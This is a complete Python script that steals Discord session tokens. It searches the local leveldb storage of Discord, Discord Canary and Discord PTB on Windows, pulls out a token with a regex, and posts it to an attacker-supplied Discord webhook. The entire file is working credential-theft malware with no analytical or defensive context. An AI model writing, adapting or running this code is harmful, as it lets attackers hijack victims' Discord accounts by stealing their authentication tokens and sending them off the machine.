import requests
import os
import re

# Discord Webhook URL
webhook_url = "Paste Webhook Here"

# Function to get Discord token from running processes
def get_discord_token():
    # List of directories to search for discord tokens
    directories = [
        os.path.expandvars("%APPDATA%\\Discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
    ]
    
    for directory in directories:
        if os.path.exists(directory):
            for file in os.listdir(directory):
                if file.endswith(".ldb") or file.endswith(".log"):
                    with open(os.path.join(directory, file), "rb") as f:
                        content = f.read().decode("utf-8", "ignore")
                        # Search for the token using a regex
                        token_search = re.search(r'([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})', content)
                        if token_search:
                            return token_search.group(1)
    return None

# Function to send the token to the Discord webhook
def send_token_to_webhook(token):
    headers = {
        'Content-Type': 'application/json',
    }
    data = {
        'content': f'Discord Token: `{token}`'
    }
    response = requests.post(webhook_url, headers=headers, json=data)
    if response.status_code == 204:
        print("Token sent to webhook successfully.")
    else:
        print(f"Failed to send token to webhook. Status code: {response.status_code}")

# Main function
def main():
    token = get_discord_token()
    if token:
        send_token_to_webhook(token)
    else:
        print("Discord token not found.")

if __name__ == "__main__":
    main()
